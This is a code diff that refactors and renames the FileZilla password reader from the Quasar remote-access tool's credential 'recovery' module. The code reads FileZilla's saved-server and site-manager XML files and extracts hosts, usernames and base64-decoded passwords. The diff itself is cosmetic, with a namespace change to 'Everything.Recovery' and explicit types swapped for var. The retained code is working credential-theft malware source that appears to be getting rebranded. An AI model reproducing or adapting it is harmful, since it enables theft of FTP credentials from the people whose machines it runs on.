@@ -1,11 +1,12 @@
-﻿using Quasar.Common.Models;
+﻿using Everything.Recovery;
+using Quasar.Common.Models;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Text;
 using System.Xml;
 
-namespace Quasar.Client.Recovery.FtpClients
+namespace Everything.Recovery.FtpClients
 {
     public class FileZillaPassReader : IAccountReader
     {
@@ -19,7 +20,7 @@ namespace Quasar.Client.Recovery.FtpClients
         /// <inheritdoc />
         public IEnumerable<RecoveredAccount> ReadAccounts()
         {
-            List<RecoveredAccount> data = new List<RecoveredAccount>();
+            var data = new List<RecoveredAccount>();
             try
             {
                 if (!File.Exists(RecentServerPath) && !File.Exists(SiteManagerPath))
@@ -27,15 +28,15 @@ namespace Quasar.Client.Recovery.FtpClients
 
                 if (File.Exists(RecentServerPath))
                 {
-                    XmlTextReader xmlTReader = new XmlTextReader(RecentServerPath);
-                    XmlDocument xmlDoc = new XmlDocument();
+                    var xmlTReader = new XmlTextReader(RecentServerPath);
+                    var xmlDoc = new XmlDocument();
                     xmlDoc.Load(xmlTReader);
 
                     foreach (XmlNode xmlNode in xmlDoc.DocumentElement.ChildNodes[0].ChildNodes)
                     {
-                        string szHost = string.Empty;
-                        string szUsername = string.Empty;
-                        string szPassword = string.Empty;
+                        var szHost = string.Empty;
+                        var szUsername = string.Empty;
+                        var szPassword = string.Empty;
                         foreach (XmlNode xmlNodeChild in xmlNode.ChildNodes)
                         {
                             if (xmlNodeChild.Name == "Host")
@@ -60,15 +61,15 @@ namespace Quasar.Client.Recovery.FtpClients
 
                 if (File.Exists(SiteManagerPath))
                 {
-                    XmlTextReader xmlTReader = new XmlTextReader(SiteManagerPath);
-                    XmlDocument xmlDoc = new XmlDocument();
+                    var xmlTReader = new XmlTextReader(SiteManagerPath);
+                    var xmlDoc = new XmlDocument();
                     xmlDoc.Load(xmlTReader);
 
                     foreach (XmlNode xmlNode in xmlDoc.DocumentElement.ChildNodes[0].ChildNodes)
                     {
-                        string szHost = string.Empty;
-                        string szUsername = string.Empty;
-                        string szPassword = string.Empty;
+                        var szHost = string.Empty;
+                        var szUsername = string.Empty;
+                        var szPassword = string.Empty;
                         foreach (XmlNode xmlNodeChild in xmlNode.ChildNodes)
                         {
                             if (xmlNodeChild.Name == "Host")
@@ -102,7 +103,7 @@ namespace Quasar.Client.Recovery.FtpClients
         {
             try
             {
-                byte[] base64ByteArray = Convert.FromBase64String(szInput);
+                var base64ByteArray = Convert.FromBase64String(szInput);
                 return Encoding.UTF8.GetString(base64ByteArray);
             }
             catch
